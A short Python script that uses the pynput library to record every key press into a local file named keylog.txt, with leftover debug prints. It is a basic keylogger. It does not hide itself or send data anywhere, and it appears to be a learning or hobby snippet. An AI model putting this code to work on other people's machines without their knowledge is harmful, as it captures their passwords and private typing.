from pynput import keyboard

pressed_keys = set() 
def on_press(key): 
    if key in pressed_keys: 
        print('here3', 'exited')
        return 
    try:
        print('here1', key.char)
        with open("keylog.txt",'a') as f: 
            f.write(key.char) # a - z A-Z 0-9 
    except AttributeError:
        print('here2', key)
        with open("keylog.txt",'a') as f: 
            f.write('\n')
            f.write(str(key))
            f.write('\n')
def on_release(key):
    pressed_keys.discard(key)
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
